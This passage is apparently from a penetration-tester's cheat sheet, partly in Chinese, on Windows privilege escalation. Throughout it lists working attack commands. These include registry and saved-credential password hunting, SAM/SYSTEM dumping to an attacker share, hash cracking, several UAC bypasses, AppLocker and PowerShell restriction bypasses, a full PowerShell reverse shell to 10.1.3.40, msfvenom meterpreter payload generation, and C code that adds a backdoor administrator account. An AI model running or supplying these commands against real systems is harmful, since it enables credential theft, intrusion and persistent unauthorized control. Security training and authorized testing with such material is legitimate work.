Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

### Pwd in reg

```bat
# Search the registry for key names and passwords, lots of output.
## /F, search key
## /T, reg type
## /S, search all subkey and values
## /K, search with key name
## /d, search value
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d

#autologon passwd
#--command prompt
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#--powershell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"

#--powerup
Get-RegistryAutoLogon

#VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

#Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

#SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" /s

#Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# ssh
reg query "HKCU\Software\OpenSSH\Agent\Key"

#Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Saved Cred

```bat
# check with wpeas
winpeasnay.exe quiet cmd windowscreds

C:\Windows\system32>cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin


C:\Windows\system32>runas /savedcred /user:admin c:\privesc\msh.exe
runas /savedcred /user:admin c:\privesc\msh.exe

```

### pwd-SAM
+ insecurely stored backups of the SAM and SYSTEM files, eg c:\windows\repair\
+ creddump7 on kali dumped hash would be wrong/incorrect on windows. use the new repo from git.
+ pwddump2/creddump7 dump works fine on windows7

```bat
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\

git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM

# Crack the admin NTLM hash using hashcat:
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

# dump with samdump2, the pwd/hash dumped via this could be wrong on windows 10.
samdump2 system sam
```

### Tools search pwd
+ [MSF-Credentials Plugin](https://github.com/carlospolop/MSF-Credentials) is a msf plugin I have created this plugin to automatically execute every metasploit POST module that searches for credentials inside the victim.
+ [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.
+ [Lazagne](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.
+ The tool [SessionGopher](https://github.com/Arvanaghi/SessionGopher) search for sessions, usernames and passwords of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)

```powershell
# msf-credentials plugin

# winpeas

# Sessiongopher
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

### VHD file
+ contain sam and system, extract password.
  
```bash
# mount vhd file
sudo guestmount --add /mnt/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd/

# extract password
secretsdump.py -sam SAM -system SYSTEM local
```

## UAC Bypass
p546
> UAC是从Windows Vista开始引入的安全特性，为了防止回环攻击和恶意软件，UAC默认对网络共享访问有如下限制：
> + 对于本地用户，只有用administrator (SID 500) 远程访问网络共享时可以获取完整的管理员权限，而本地管理员组的其他成员无法获取完整的管理员权限，无法进行远程管理。
> + 对于域用户，所有域管理员组的成员在访问网络共享时都可以获取完整的管理员权限，不受UAC限制

Process Monitor，identifying flaws such as Registry hijacking, DLL hijacking.[Dowanload](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
[UAC实现原理及绕过方法](https://www.cnblogs.com/Chesky/p/UAC_Bypass.html)

```bat
# 修改注册表项禁用UAC限制，修改后立即生效，无需重
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### fodhelper
> 参考
> https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
> https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/

```bat
#-sigcheck查看applicationmanifest
# https://docs.microsoft.com/en-us/sysinternals/
#-a obtain extended information
#-m dump manifest
#-<requestedExecutionLevel level="requireAdministrator"/>
#-<autoElevate>true</autoElevate>
sigcheck.exe -a -m c:\windows\system32\fodhelper.exe

#-添加/修改注册表
# /v specify the value name
# /t specify type
# /d specify new registry value
# /f add value silently
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ

# 修改注册表，启动时 启动cmd.exe
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

### eventvwr
> 原理同fodhelper.exe
参考1: ["FILELESS" UAC BYPASS USING EVENTVWR.EXE AND REGISTRY HIJACKING](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
> 修改c文件，编译生成exe
[bypasssing default uac settings mannually](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)

```bat
#-查看权限信息
sigcheck.exe -accepteula -a -m c:\Windows\System32\eventvwr.exe

#-修改注册表
reg query HKCU\Software\Classes\mscfile\shell\open\command
reg add HKCU\Software\Classes\mscfile\shell\open\command
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "c:\users\alice\shelluac.exe" /f

#-start
eventvwr.exe

#-Invoke-EventVwrBypass
# https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
# tested on win7 and win10

#-enc encodedCommand
Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGM..."
```

### Nishang-PsUACme
参考：https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-escalting-to-system/

> 支持windows 2012, no win10
>

```powershell
#-powershell to spawn a cmd process with high integrity
powershell.exe Start-Process cmd.exe -Verb runAs

#使用sysprep方法并执行默认的payload
Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -verbose

#使用oobe方法并执行默认的payload
Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -method oobe -verbose

#-Invoke-PsUACme， with oobe and reverse.ps1
wget https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1

#-reverse.ps1,修改ip、端口
$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#-upload ps1 file
PS C:\temp> . .\Invoke-PsUACme.ps1
PS C:\temp> Invoke-PsUACme -method oobe -Payload "powershell -ExecutionPolicy Bypass -noexit -file c:\temp\reverse.ps1"
```

### kali bypassuac.exe

```bat
#-locate，根据arch选取合适的exe
locate bypassuac

#-上传并执行木马exe
bypassuac-x64.exe /c C:\BypassUAC\reverse_4444.exe
```

### MSF bypass
> bypassuac: 运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低
> bypassuac_injection: 运行在内存的反射DLL中，不会接触目标机器的硬盘，降低了被杀毒软件检测出来的概率
> msf bypassuac前提：
> + 当前用户在administators groups
> + UAC设置为默认，“仅在程序试图更改我的计算机时通知我”

```bat
use exploit/windows/local/bypassuac

use exploit/windows/local/bypassuac_injection

use exploit/windows/local/bypassuac
set session 1
set lhost 0.0.0.0
set lport 24444
exploit
```

## Special
+ pg-symbolic: backup dir/files(have permission to write/create), create symboliclink to admin ssh key and backup.
+ [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools/)

```bash
# backup service, symbolic link to admin ssh key
## wait for a few minutes, read the file.
C:\backup\logs>c:\users\p4yl0ad\CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"
Opened Link \RPC Control\request.log -> \??\C:\Users\Administrator\.ssh\id_rsa: 00000158
Press ENTER to exit and delete the symlink


```

## windows security control

### applocker 
+ An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. 

```bash
# check 
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections

## or registry
HKLM\Software\Policies\Microsoft\Windows\SrpV2

# bypass
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

### PS CLM
+ powershell Constrained Language Mode

```bash
# check, values could be: FullLanguage or ConstrainedLanguage
$ExecutionContext.SessionState.LanguageMode

# bypass1 Easy bypass
Powershell -version 2

# bypass 2, PSByPassCLM.
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
## reverse shell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe

# bypass 3, msbuild bypass
## https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml
msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=10.10.14.90 lport=443 -e x86/shikata_ga_nai -i 20 -f csharp -o meterpreter_443.cs -v shellcode 

## copy msf payload to shellcode.xml

## upload to target
iwr -uri http://10.10.14.90/shellcode.xml -outfile shell.xml
copy shell.xml  c:\windows\system32\spool\drivers\color\

c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe shell.xml

```

## Tolearn- AntiVirus and Detectors


## C payload

### Compile
windows gcc compile; [mingw-w64](https://mingw-w64.org/doku.php)

### add user

```C
#include <stdlib.h>

int main()
{
int i;
i = system("net user evil Ev!lpass /add");
i = system("net localgroup administrators evil /add");
return 0;
}
```

compile on kali

```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe

```
